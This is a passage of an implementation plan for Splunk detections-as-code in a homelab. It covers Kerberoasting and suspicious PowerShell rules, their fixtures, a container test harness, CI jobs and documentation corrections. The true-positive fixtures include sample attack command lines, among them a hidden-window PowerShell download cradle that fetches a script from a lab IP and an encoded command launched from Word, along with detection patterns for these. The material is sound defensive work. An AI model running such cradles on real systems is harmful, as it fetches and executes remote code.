    A single RC4 ticket request is unremarkable: legacy applications and older
    service accounts still negotiate RC4. What distinguishes roasting is
    breadth and speed — a tool enumerates every SPN in the domain and requests
    a ticket for each in seconds. Five distinct service names from one
    principal inside ten minutes is enumeration followed by bulk roasting, a
    pattern no single legacy application produces.
false_positives:
  - scenario: A legacy application whose service account genuinely negotiates RC4.
    guidance: >
      Such an application requests tickets for one or two SPNs, not five. If it
      does exceed the threshold, exclude that Service_Name rather than raising
      the threshold for every principal.
  - scenario: An authorised internal assessment running a roasting tool.
    guidance: >
      Confirm against the engagement schedule and the Client_Address of the
      testing host. Record it; do not permanently exclude the tester's subnet.
response: >
  Identify the Account_Name making the requests and whether Client_Address is a
  host that principal normally uses. Treat every SPN in the services field as a
  potentially cracked credential and rotate those service account passwords.
references:
  - https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4769
  - https://attack.mitre.org/techniques/T1558/003/
```

`search.spl`:

```
index=wineventlog sourcetype="XmlWinEventLog:Security" EventCode=4769 Ticket_Encryption_Type="0x17" Ticket_Options="0x40810000" Failure_Code="0x0"
| where NOT match(Service_Name, "\$$") AND Service_Name!="krbtgt"
| bucket _time span=10m
| stats dc(Service_Name) AS services_requested,
        values(Service_Name) AS services
        BY _time, Account_Name, Client_Address
| where services_requested >= 5
```

`savedsearches.conf`:

```conf
# Alert configuration for win_kerberoasting_4769.
# search.spl is the source of truth; the parity test fails on drift.

[Homelab - Kerberoasting (T1558.003)]
search = index=wineventlog sourcetype="XmlWinEventLog:Security" EventCode=4769 Ticket_Encryption_Type="0x17" Ticket_Options="0x40810000" Failure_Code="0x0" \
| where NOT match(Service_Name, "\$$") AND Service_Name!="krbtgt" \
| bucket _time span=10m \
| stats dc(Service_Name) AS services_requested, values(Service_Name) AS services BY _time, Account_Name, Client_Address \
| where services_requested >= 5
description = One principal requesting RC4 service tickets for five or more distinct SPNs in ten minutes.
cron_schedule = */10 * * * *
dispatch.earliest_time = -15m@m
dispatch.latest_time = now
enableSched = 1
counttype = number of events
relation = greater than
quantity = 0
alert.severity = 6
alert.suppress = 1
alert.suppress.fields = Account_Name
alert.suppress.period = 2h
action.email = 0
```

`events/true_positive.jsonl` — five distinct SPNs, RC4, one principal, ten minutes:

```
{"_time": "2026-09-01T15:00:03Z", "EventCode": 4769, "Ticket_Encryption_Type": "0x17", "Ticket_Options": "0x40810000", "Failure_Code": "0x0", "Service_Name": "MSSQLSvc", "Account_Name": "jbloggs", "Client_Address": "10.10.10.50"}
{"_time": "2026-09-01T15:00:05Z", "EventCode": 4769, "Ticket_Encryption_Type": "0x17", "Ticket_Options": "0x40810000", "Failure_Code": "0x0", "Service_Name": "HTTP-intranet", "Account_Name": "jbloggs", "Client_Address": "10.10.10.50"}
{"_time": "2026-09-01T15:00:06Z", "EventCode": 4769, "Ticket_Encryption_Type": "0x17", "Ticket_Options": "0x40810000", "Failure_Code": "0x0", "Service_Name": "CIFS-fileserver", "Account_Name": "jbloggs", "Client_Address": "10.10.10.50"}
{"_time": "2026-09-01T15:00:08Z", "EventCode": 4769, "Ticket_Encryption_Type": "0x17", "Ticket_Options": "0x40810000", "Failure_Code": "0x0", "Service_Name": "svc_backup", "Account_Name": "jbloggs", "Client_Address": "10.10.10.50"}
{"_time": "2026-09-01T15:00:11Z", "EventCode": 4769, "Ticket_Encryption_Type": "0x17", "Ticket_Options": "0x40810000", "Failure_Code": "0x0", "Service_Name": "svc_reporting", "Account_Name": "jbloggs", "Client_Address": "10.10.10.50"}
```

`events/benign.jsonl` — machine accounts, krbtgt, AES tickets, and one legitimate RC4 legacy app. None of these may fire the rule:

```
{"_time": "2026-09-01T16:00:03Z", "EventCode": 4769, "Ticket_Encryption_Type": "0x17", "Ticket_Options": "0x40810000", "Failure_Code": "0x0", "Service_Name": "WKSTN01$", "Account_Name": "WKSTN01$", "Client_Address": "10.10.10.20"}
{"_time": "2026-09-01T16:00:04Z", "EventCode": 4769, "Ticket_Encryption_Type": "0x17", "Ticket_Options": "0x40810000", "Failure_Code": "0x0", "Service_Name": "DC01$", "Account_Name": "DC01$", "Client_Address": "10.10.10.10"}
{"_time": "2026-09-01T16:00:05Z", "EventCode": 4769, "Ticket_Encryption_Type": "0x17", "Ticket_Options": "0x40810000", "Failure_Code": "0x0", "Service_Name": "krbtgt", "Account_Name": "jbloggs", "Client_Address": "10.10.10.60"}
{"_time": "2026-09-01T16:00:06Z", "EventCode": 4769, "Ticket_Encryption_Type": "0x12", "Ticket_Options": "0x40810000", "Failure_Code": "0x0", "Service_Name": "MSSQLSvc", "Account_Name": "asmith", "Client_Address": "10.10.10.61"}
{"_time": "2026-09-01T16:00:07Z", "EventCode": 4769, "Ticket_Encryption_Type": "0x12", "Ticket_Options": "0x40810000", "Failure_Code": "0x0", "Service_Name": "HTTP-intranet", "Account_Name": "asmith", "Client_Address": "10.10.10.61"}
{"_time": "2026-09-01T16:00:08Z", "EventCode": 4769, "Ticket_Encryption_Type": "0x12", "Ticket_Options": "0x40810000", "Failure_Code": "0x0", "Service_Name": "CIFS-fileserver", "Account_Name": "asmith", "Client_Address": "10.10.10.61"}
{"_time": "2026-09-01T16:00:09Z", "EventCode": 4769, "Ticket_Encryption_Type": "0x12", "Ticket_Options": "0x40810000", "Failure_Code": "0x0", "Service_Name": "svc_backup", "Account_Name": "asmith", "Client_Address": "10.10.10.61"}
{"_time": "2026-09-01T16:00:10Z", "EventCode": 4769, "Ticket_Encryption_Type": "0x12", "Ticket_Options": "0x40810000", "Failure_Code": "0x0", "Service_Name": "svc_reporting", "Account_Name": "asmith", "Client_Address": "10.10.10.61"}
{"_time": "2026-09-01T16:05:00Z", "EventCode": 4769, "Ticket_Encryption_Type": "0x17", "Ticket_Options": "0x40810000", "Failure_Code": "0x0", "Service_Name": "svc_legacyapp", "Account_Name": "rpatel", "Client_Address": "10.10.10.62"}
```

- [ ] **Step 4: Create `win_suspicious_process_4688`**

`detection.yml` — note the `prerequisites` field, which is why this rule is honest rather than broken:

```yaml
---
id: win_suspicious_process_4688
title: Suspicious PowerShell invocation — encoded, hidden, or download cradle
status: validated-offline
version: 1
author: Angus Dawson
date: 2026-09-12
description: >
  Detects PowerShell started with the flags and cradles associated with
  execution of attacker-supplied code: encoded commands, a hidden window, and
  in-memory download-and-execute patterns. Matches on the recorded command
  line of EventCode 4688 process creation events.
attack:
  - tactic: execution
    technique: T1059.001
    name: PowerShell
data_source:
  log: Windows Security
  event_codes: [4688]
  audit_subcategory: Process Creation
  required_fields:
    - EventCode
    - New_Process_Name
    - Process_Command_Line
    - Computer
    - Account_Name
    - Creator_Process_Name
  prerequisites:
    - >
      Requires ProcessCreationIncludeCmdLine_Enabled=1. Without it, 4688 is
      logged but Process_Command_Line is empty and this detection returns
      nothing. The lab's audit GPO
      (projects/defensive/windows_server_with_AD/ansible/vars/gpos.yml) enables
      the Process Creation subcategory but does NOT set this value, so this
      detection would not fire in the lab as currently configured. Closing the
      gap needs this registry setting under the Homelab - Audit Policy GPO -
      path HKLM:\Software\Policies\Microsoft\Windows\System, name
      ProcessCreationIncludeCmdLine_Enabled, type dword, value 1.
logic:
  window: 0m
  threshold: 1
  rationale: >
    Unlike the other rules here this one is not a threshold detection: a single
    encoded or hidden-window PowerShell invocation is worth an analyst's
    attention, so the threshold is one event and the window is the scheduled
    dispatch range rather than a bucket. Counting would only delay the alert
    without reducing false positives, because the selectivity comes from the
    command-line patterns rather than from volume.
false_positives:
  - scenario: Software deployment or management tooling that legitimately uses -EncodedCommand.
    guidance: >
      Check Creator_Process_Name. Deployment agents have a consistent parent
      process; exclude on that parent rather than on the encoded-command flag,
      which is the part carrying the signal.
  - scenario: An administrator's own automation using -WindowStyle Hidden.
    guidance: >
      Confirm with the account owner and exclude the specific script path if
      the command line contains one.
response: >
  Decode any base64 payload in Process_Command_Line before judging it, then
  establish whether Creator_Process_Name is a plausible parent for PowerShell.
  Office applications and browsers spawning PowerShell are the strongest
  indicator that the invocation is not administrative.
references:
  - https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4688
  - https://attack.mitre.org/techniques/T1059/001/
```

`search.spl`:

```
index=wineventlog sourcetype="XmlWinEventLog:Security" EventCode=4688 (New_Process_Name="*\\powershell.exe" OR New_Process_Name="*\\pwsh.exe")
| where match(Process_Command_Line, "(?i)\s-e(nc|ncoded|ncodedcommand)?\s")
     OR match(Process_Command_Line, "(?i)-w(indowstyle)?\s+hidden")
     OR match(Process_Command_Line, "(?i)(FromBase64String|IEX|Invoke-Expression|DownloadString)")
| table _time, Computer, Account_Name, Creator_Process_Name, New_Process_Name, Process_Command_Line
```

`savedsearches.conf`:

```conf
# Alert configuration for win_suspicious_process_4688.
# search.spl is the source of truth; the parity test fails on drift.
#
# NOTE: requires ProcessCreationIncludeCmdLine_Enabled=1 on the endpoint. See
# the prerequisites field in detection.yml.

[Homelab - Suspicious PowerShell Invocation (T1059.001)]
search = index=wineventlog sourcetype="XmlWinEventLog:Security" EventCode=4688 (New_Process_Name="*\\powershell.exe" OR New_Process_Name="*\\pwsh.exe") \
| where match(Process_Command_Line, "(?i)\s-e(nc|ncoded|ncodedcommand)?\s") OR match(Process_Command_Line, "(?i)-w(indowstyle)?\s+hidden") OR match(Process_Command_Line, "(?i)(FromBase64String|IEX|Invoke-Expression|DownloadString)") \
| table _time, Computer, Account_Name, Creator_Process_Name, New_Process_Name, Process_Command_Line
description = PowerShell started with an encoded command, a hidden window, or a download cradle.
cron_schedule = */5 * * * *
dispatch.earliest_time = -10m@m
dispatch.latest_time = now
enableSched = 1
counttype = number of events
relation = greater than
quantity = 0
alert.severity = 6
alert.suppress = 1
alert.suppress.fields = Computer,Account_Name
alert.suppress.period = 30m
action.email = 0
```

`events/true_positive.jsonl`:

```
{"_time": "2026-09-01T17:00:03Z", "EventCode": 4688, "New_Process_Name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "Process_Command_Line": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA", "Computer": "WKSTN01.homelab.local", "Account_Name": "jbloggs", "Creator_Process_Name": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"}
{"_time": "2026-09-01T17:04:19Z", "EventCode": 4688, "New_Process_Name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "Process_Command_Line": "powershell.exe -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.50/a.ps1')\"", "Computer": "WKSTN01.homelab.local", "Account_Name": "jbloggs", "Creator_Process_Name": "C:\\Windows\\explorer.exe"}
{"_time": "2026-09-01T17:09:52Z", "EventCode": 4688, "New_Process_Name": "C:\\Program Files\\PowerShell\\7\\pwsh.exe", "Process_Command_Line": "pwsh.exe -c [System.Convert]::FromBase64String('YQBiAGMA')", "Computer": "WKSTN01.homelab.local", "Account_Name": "asmith", "Creator_Process_Name": "C:\\Windows\\System32\\cmd.exe"}
```

`events/benign.jsonl` — ordinary PowerShell, and a non-PowerShell process whose command line would otherwise match:

```
{"_time": "2026-09-01T18:00:03Z", "EventCode": 4688, "New_Process_Name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "Process_Command_Line": "powershell.exe -File C:\\Scripts\\Get-DiskSpace.ps1", "Computer": "WKSTN01.homelab.local", "Account_Name": "svc_monitor", "Creator_Process_Name": "C:\\Windows\\System32\\taskeng.exe"}
{"_time": "2026-09-01T18:02:41Z", "EventCode": 4688, "New_Process_Name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "Process_Command_Line": "powershell.exe -NoProfile -Command Get-Service -Name Splunkd", "Computer": "WKSTN01.homelab.local", "Account_Name": "jbloggs", "Creator_Process_Name": "C:\\Windows\\explorer.exe"}
{"_time": "2026-09-01T18:05:10Z", "EventCode": 4688, "New_Process_Name": "C:\\Windows\\System32\\notepad.exe", "Process_Command_Line": "notepad.exe C:\\Users\\jbloggs\\IEX-notes.txt", "Computer": "WKSTN01.homelab.local", "Account_Name": "jbloggs", "Creator_Process_Name": "C:\\Windows\\explorer.exe"}
```

That third benign event is the important one: its command line contains `IEX`, so it is caught by the pattern but must be excluded by the `New_Process_Name` filter. It tests that the two halves of the search work together.

- [ ] **Step 5: Run tests to verify all four rules pass**

Run: `python -m pytest tests/test_metadata.py -v`
Expected: PASS, 31 tests (3 suite-wide + 7 per-rule × 4 rules).

- [ ] **Step 6: Lint and stage**

```bash
ruff check --fix projects/defensive/splunk/detections && ruff format projects/defensive/splunk/detections && git add projects/defensive/splunk/detections
```

Commit message for the owner: `feat(splunk): add lockout, Kerberoasting and PowerShell detections`

---

### Task 6: Splunk container harness

**Files:**
- Create: `…/detections/lib/splunk_harness.py`
- Modify: `pyproject.toml` (repo root)

**Interfaces:**
- Consumes: `substitute_index()` from Task 1.
- Produces: `lib.splunk_harness.SplunkContainer` with `start() -> None`, `stop() -> None`, `create_index(name: str) -> None`, `ingest(index: str, events: list[dict]) -> None`, `search(spl: str, index: str) -> list[dict]`; and module constant `IMAGE`. Task 7's fixtures use all of them.

- [ ] **Step 1: Register the `docker` marker in `pyproject.toml`**

Modify the `[tool.pytest.ini_options]` block at the repo root. Replace the `addopts` line and add `markers`:

```toml
# `-m "not docker"` keeps the default run fast and Docker-free. The behaviour
# tests that pull a multi-GB Splunk image are opt-in via `pytest -m docker`,
# and run in their own CI job.
addopts = "-ra -m 'not docker'"
markers = [
    "docker: test requires Docker and pulls the Splunk container image",
]
```

- [ ] **Step 2: Write `lib/splunk_harness.py`**

```python
"""Ephemeral Splunk container used to execute detection searches.

The lab this repo documents is torn down, so detections cannot be validated
against it. This harness makes CI the execution environment instead: it starts
Splunk, loads a rule's fixture events, runs that rule's real SPL, and returns
the rows. What it proves is detection logic. It does not prove Windows Event
XML field extraction, which is the Splunk Add-on for Windows' job — see
README.md in this directory.
"""

from __future__ import annotations

import datetime as dt
import json
import os
import secrets
import subprocess
import time
import uuid

import requests
import urllib3

from lib.loader import substitute_index

IMAGE = "splunk/splunk:9.3.2"
CONTAINER_NAME = "splunk-detection-tests"

# Generated per run rather than hardcoded. A literal password here would be a
# secret committed to the repo — which the repo's own gitleaks hook exists to
# stop — even though this container is throwaway and never leaves the runner.
PASSWORD = os.environ.get("SPLUNK_TEST_PASSWORD") or secrets.token_urlsafe(16)
HEC_TOKEN = os.environ.get("SPLUNK_TEST_HEC_TOKEN") or str(uuid.uuid4())

MGMT = "https://localhost:8089"
HEC = "http://localhost:8088"
STARTUP_TIMEOUT_S = 300

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class SplunkContainer:
    """Starts, populates and queries a throwaway Splunk Enterprise container."""

    def __init__(self) -> None:
        self._session = requests.Session()
        self._session.verify = False
        self._session.auth = ("admin", PASSWORD)

    def start(self) -> None:
        subprocess.run(["docker", "rm", "-f", CONTAINER_NAME], capture_output=True, check=False)
        subprocess.run(
            [
                "docker", "run", "-d", "--name", CONTAINER_NAME,
                "-p", "8089:8089", "-p", "8088:8088",
                "-e", "SPLUNK_START_ARGS=--accept-license",
                "-e", f"SPLUNK_PASSWORD={PASSWORD}",
                "-e", f"SPLUNK_HEC_TOKEN={HEC_TOKEN}",
                IMAGE,
            ],
            check=True,
            capture_output=True,
        )
        self._wait_until_ready()

    def _wait_until_ready(self) -> None:
        deadline = time.monotonic() + STARTUP_TIMEOUT_S
        while time.monotonic() < deadline:
            try:
                r = self._session.get(f"{MGMT}/services/server/info", timeout=5)
                if r.status_code == 200:
                    return
            except requests.RequestException:
                pass
            time.sleep(5)
        logs = subprocess.run(
            ["docker", "logs", "--tail", "50", CONTAINER_NAME],
            capture_output=True, text=True, check=False,
        )
        raise TimeoutError(f"Splunk not ready in {STARTUP_TIMEOUT_S}s. Logs:\n{logs.stdout}")

    def stop(self) -> None:
        subprocess.run(["docker", "rm", "-f", CONTAINER_NAME], capture_output=True, check=False)

    def create_index(self, name: str) -> None:
        r = self._session.post(
            f"{MGMT}/services/data/indexes",
            data={"name": name, "output_mode": "json"},
            timeout=30,
        )
        # 409 means the index already exists, which is fine.
        if r.status_code not in (200, 201, 409):
            raise RuntimeError(f"could not create index {name}: {r.status_code} {r.text}")

    def ingest(self, index: str, events: list[dict]) -> None:
        payload = "".join(
            json.dumps(
                {
                    "time": _epoch(event["_time"]),
                    "index": index,
                    "sourcetype": "XmlWinEventLog:Security",
                    "event": {k: v for k, v in event.items() if k != "_time"},
                }
            )
            for event in events
        )
        r = requests.post(
            f"{HEC}/services/collector/event",
            headers={"Authorization": f"Splunk {HEC_TOKEN}"},
            data=payload,
            timeout=30,
        )
        r.raise_for_status()
        self._wait_for_event_count(index, len(events))

    def _wait_for_event_count(self, index: str, expected: int) -> None:
        """HEC acknowledges before indexing completes; poll until searchable."""
        deadline = time.monotonic() + 60
        while time.monotonic() < deadline:
            rows = self._raw_search(f"search index={index} | stats count AS n")
            if rows and int(rows[0]["n"]) >= expected:
                return
            time.sleep(2)
        raise TimeoutError(f"only indexed fewer than {expected} events into {index}")

    def search(self, spl: str, index: str) -> list[dict]:
        return self._raw_search(f"search {substitute_index(spl, index)}")

    def _raw_search(self, query: str) -> list[dict]:
        r = self._session.post(
            f"{MGMT}/services/search/jobs",
            data={
                "search": query,
                "exec_mode": "oneshot",
                "output_mode": "json",
                "earliest_time": "2026-01-01T00:00:00",
                "latest_time": "2027-01-01T00:00:00",
                "count": 0,
            },
            timeout=120,
        )
        r.raise_for_status()
        return r.json().get("results", [])


def _epoch(timestamp: str) -> float:
    return dt.datetime.fromisoformat(timestamp.replace("Z", "+00:00")).timestamp()
```

The absolute `earliest_time`/`latest_time` bracket the fixed fixture timestamps, so tests do not drift as real time passes.

- [ ] **Step 3: Verify the module imports and the marker is registered**

Run: `python -c "from lib.splunk_harness import SplunkContainer, IMAGE; print(IMAGE)"`
Expected: `splunk/splunk:9.3.2`

Run: `python -m pytest --markers | head -5`
Expected: output includes `@pytest.mark.docker: test requires Docker and pulls the Splunk container image`

- [ ] **Step 4: Lint and stage**

```bash
ruff check --fix projects/defensive/splunk/detections && ruff format projects/defensive/splunk/detections && git add projects/defensive/splunk/detections pyproject.toml
```

Commit message for the owner: `feat(splunk): add ephemeral Splunk container harness for detection tests`

---

### Task 7: Behaviour tests

**Files:**
- Create: `…/detections/tests/test_behaviour.py`

**Interfaces:**
- Consumes: `SplunkContainer` (Task 6), `load_rules()` (Task 1).
- Produces: nothing importable.

- [ ] **Step 1: Write the test**

`tests/test_behaviour.py`:

```python
"""Layer A: behaviour validation. Runs each rule's real SPL against real Splunk.

Marked `docker` and deselected by default (see addopts in the root
pyproject.toml). Run explicitly with `pytest -m docker`.
"""

import pytest

from lib.loader import load_rules
from lib.splunk_harness import SplunkContainer

pytestmark = pytest.mark.docker

RULES = load_rules()


@pytest.fixture(scope="session")
def splunk():
    container = SplunkContainer()
    container.start()
    yield container
    container.stop()


@pytest.mark.parametrize("rule", RULES, ids=lambda r: r.id)
def test_rule_fires_on_true_positive_fixtures(splunk, rule):
    index = f"tp_{rule.id}"
    splunk.create_index(index)
    splunk.ingest(index, rule.true_positive_events)

    rows = splunk.search(rule.spl, index)

    assert rows, f"{rule.id}: no rows returned for true-positive fixtures"


@pytest.mark.parametrize("rule", RULES, ids=lambda r: r.id)
def test_rule_is_silent_on_benign_fixtures(splunk, rule):
    index = f"benign_{rule.id}"
    splunk.create_index(index)
    splunk.ingest(index, rule.benign_events)

    rows = splunk.search(rule.spl, index)

    assert not rows, (
        f"{rule.id}: fired on benign fixtures, returning {len(rows)} row(s): {rows[:2]}"
    )
```

Each test uses its own index, so a true-positive fixture can never leak into the benign assertion. That isolation is the reason the harness rewrites `index=` rather than reusing one shared index.

- [ ] **Step 2: Verify the tests are deselected by default**

Run: `python -m pytest -v`
Expected: the metadata tests run; every `test_behaviour.py` test is deselected. The summary line reports `31 passed, 8 deselected`.

- [ ] **Step 3: Run the behaviour tests**

Run: `python -m pytest -m docker -v`
Expected: PASS, 8 tests. First run takes several minutes while the image pulls and Splunk starts.

If a rule fails `test_rule_fires_on_true_positive_fixtures`, the SPL and the fixtures disagree — fix whichever is wrong, and note that this is exactly the failure the project exists to surface. Do not weaken the assertion to make it pass.

- [ ] **Step 4: Stage**

```bash
git add projects/defensive/splunk/detections
```

Commit message for the owner: `test(splunk): execute every detection against an ephemeral Splunk instance`

---

### Task 8: CI wiring

**Files:**
- Modify: `.github/workflows/ci.yml`

**Interfaces:**
- Consumes: everything above.
- Produces: nothing importable.

- [ ] **Step 1: Add the detections project to the test matrix**

In the `test` job's `strategy.matrix.project` list, add a fourth entry:

```yaml
          - projects/defensive/splunk/detections
```

- [ ] **Step 2: Add the `detection-tests` job**

Append to the `jobs:` block:

```yaml
  detection-tests:
    name: Detection behaviour tests
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-python@v5
        with:
          python-version: "3.12"
          cache: pip
          cache-dependency-path: projects/defensive/splunk/detections/requirements-dev.txt

      - name: Install dependencies
        working-directory: projects/defensive/splunk/detections
        run: |
          python -m pip install --upgrade pip
          pip install -r requirements-dev.txt

      - name: Execute detections against ephemeral Splunk
        working-directory: projects/defensive/splunk/detections
        # Separate from the `test` job on purpose: this pulls a multi-GB image
        # and starts Splunk, so a container hiccup must not red the main build
        # or the CI badge.
        run: python -m pytest -m docker -v
```

- [ ] **Step 3: Validate the workflow parses and the matrix is right**

Run from the repo root:

```bash
python -c "import yaml; d=yaml.safe_load(open('.github/workflows/ci.yml')); print(list(d['jobs'])); print(d['jobs']['test']['strategy']['matrix']['project'])"
```

Expected: jobs list includes `detection-tests`; the project list has four entries ending in `projects/defensive/splunk/detections`.

- [ ] **Step 4: Stage**

```bash
git add .github/workflows/ci.yml
```

Commit message for the owner: `ci: run detection metadata and behaviour tests`

---

### Task 9: Detections README

**Files:**
- Create: `…/detections/README.md`
- Modify: `projects/defensive/splunk/README.md`

**Interfaces:** none.

- [ ] **Step 1: Write `detections/README.md`**

Cover exactly these sections, in this order:

1. **What this is** — four detections as code, each with metadata, SPL, alert config and fixtures.
2. **Why the detections are these four** — a table mapping each rule to the audit subcategory in `windows_server_with_AD/ansible/vars/gpos.yml` that produces its events, with the point stated plainly: detection selection is driven by telemetry the lab's own IaC deploys.
3. **How a detection is validated** — the two layers, what each proves.
4. **What `validated-offline` means** — the logic is executed against fixtures in CI by a real Splunk instance; it has never seen live lab data. State that no detection here is `validated-in-lab` and why.
5. **The limit of the behaviour tests** — fixtures are JSON with normalised field names, so the tests prove thresholds, grouping, filtering, windowing and exclusions, but not Windows Event XML field extraction, which the Splunk Add-on for Windows owns. Say that the higher-fidelity alternative (raw Event XML plus the TA in the container) was considered and rejected for complexity, and that this boundary is documented rather than hidden.
6. **Tumbling vs sliding windows** — `bucket` gives tumbling windows; an attack on a boundary can split across two sub-threshold buckets; the scheduled search dispatches over a wider window than its interval to compensate; `streamstats` was rejected as costly at lab scale.
7. **The 4688 prerequisite** — `win_suspicious_process_4688` needs `ProcessCreationIncludeCmdLine_Enabled=1`, which the lab's GPO does not set, so it would not fire in the lab as configured. Include the registry setting that would close it.
8. **Field-reference checking is a heuristic** — `spl_field_references` recognises four SPL shapes and is not a parser; a detection using an unusual shape may need its metadata checked by hand.
9. **How to add a detection** — create the directory, write the five files, run `pytest`, then `pytest -m docker`.

- [ ] **Step 2: Link it from the Splunk project README**

In `projects/defensive/splunk/README.md`, replace the closing line of section 6 ("Full walkthrough with screenshots: …") so the section ends with both links, and add `detections/` to the Summary list:

```markdown
Full walkthrough with screenshots: [brute-force-detection-simulation/README.md](brute-force-detection-simulation/README.md).

The tuned, tested version of this detection — with a time window, a threshold
derived from the domain lockout policy, and false-positive guidance — lives in
[`detections/rules/win_bruteforce_smb_4625/`](detections/rules/win_bruteforce_smb_4625/).
```

Add to the Summary bullet list:

```markdown
- Four detections as code in [`detections/`](detections/), each executed against a real Splunk instance in CI
```

- [ ] **Step 3: Verify links resolve**

Run from the repo root:

```bash
ls projects/defensive/splunk/detections/rules/win_bruteforce_smb_4625/ projects/defensive/splunk/detections/README.md
```

Expected: all paths exist.

- [ ] **Step 4: Stage**

```bash
git add projects/defensive/splunk
```

Commit message for the owner: `docs(splunk): document the detection methodology and its limits`

---

### Task 10: Correct the Sysmon claim

**Files:**
- Modify: `docs/defensive-architecture.md`
- Modify: `docs/diagrams/defensive-architecture.html`
- Modify: `docs/diagrams/defensive-architecture.svg` (re-exported, not hand-edited)
- Modify: `README.md` (repo root)

**Interfaces:** none.

Sysmon is asserted as implemented in four places and deployed in none: there is no Sysmon config, no Ansible task installing it, and no `inputs.conf` collecting `Microsoft-Windows-Sysmon/Operational` anywhere in the repo. The repo's honest status labelling is one of its strengths; this is the single place it overstates.

- [ ] **Step 1: Confirm the claim is still unsupported before changing anything**

Run from the repo root:

```bash
grep -rniE "sysmon" --include="*.yml" --include="*.conf" --include="*.xml" --include="*.ps1" projects/ | grep -v "README"
```

Expected: no output. If this returns matches, Sysmon deployment exists after all — stop and re-evaluate this task rather than editing the docs.

- [ ] **Step 2: Correct `docs/defensive-architecture.md`**

In the Data Flow Table, change row 1's payload from `Sysmon + Windows Security event logs via Universal Forwarder` to `Windows Security event logs via Universal Forwarder`, and add a new row:

```markdown
| 5 | [Windows Server + AD](../projects/defensive/windows_server_with_AD/) | [Splunk](../projects/defensive/splunk/) | Sysmon process/network telemetry | illustrative |
```

In the "Layer-by-layer summary", change "Windows Server + AD with Sysmon and the Splunk Universal Forwarder covers the endpoint and identity side" to state that the Universal Forwarder covers Windows Security event logs today and that Sysmon is not yet deployed. In the Detection paragraph, change "runs detection content against the forwarded Sysmon and Windows Security logs" to reference Windows Security logs only, and link `projects/defensive/splunk/detections/`.

Update the alt-text on the image to: `Layered defensive architecture: simulated adversary tooling feeds perimeter and endpoint sensors, which forward telemetry to Splunk. Only the Windows Security event log feed is implemented today; the other flows are illustrative.`

In "How to read the diagram", change "a log source that is actually forwarded into Splunk and searchable" to name the Windows Security event log explicitly.

- [ ] **Step 3: Correct the diagram source**

In `docs/diagrams/defensive-architecture.html`, change the node label `SYSMON` to `WINDOWS SECURITY LOG`, the caption `sysmon · security log` to `4625 · 4740 · 4769 · 4688`, and the embedded alt/description text about the Sysmon feed to match the new alt-text from Step 2.

- [ ] **Step 4: Re-export the SVG**

Do not hand-edit `defensive-architecture.svg`. Re-export it from the corrected HTML using the diagram export skill:

Invoke: `diagram-design:export-diagram` on `docs/diagrams/defensive-architecture.html`

Expected: `defensive-architecture.svg` is regenerated next to the source.

- [ ] **Step 5: Correct the root `README.md`**

In the Projects table, change the Splunk row's description from `Onboarding Windows/Sysmon telemetry into Splunk…` to `Onboarding Windows telemetry into Splunk…`, remove `Sysmon` from that row's Key tech cell, and extend the description to mention the four tested detections. Update the architecture image's alt-text to match Step 2.

- [ ] **Step 6: Verify no unsupported Sysmon claim remains**

Run from the repo root:

```bash
grep -rniE "sysmon" --include="*.md" --include="*.html" --include="*.svg" . | grep -v "^./.git" | grep -v superpowers
```

Expected: the only remaining matches describe Sysmon as illustrative, planned, or an installed Splunk app — none assert it is a live, forwarded feed. Read each match and confirm.

- [ ] **Step 7: Run the full check and stage**

```bash
SKIP=gitleaks pre-commit run --all-files && git add README.md docs
```

Expected: all hooks pass.

Commit message for the owner: `docs: correct the Sysmon claim to match what is actually deployed`

---

## Verification

After every task, from `projects/defensive/splunk/detections/`:

```bash
python -m pytest -v
```

Before handing the branch over, from the repo root:

```bash
SKIP=gitleaks pre-commit run --all-files
```

And from the detections project, the full two-layer run:

```bash
python -m pytest -v && python -m pytest -m docker -v
```

Expected final state: 31 metadata tests pass, 8 behaviour tests pass, all pre-commit hooks pass, and `grep -rniE "sysmon"` surfaces no claim that Sysmon is a live feed.
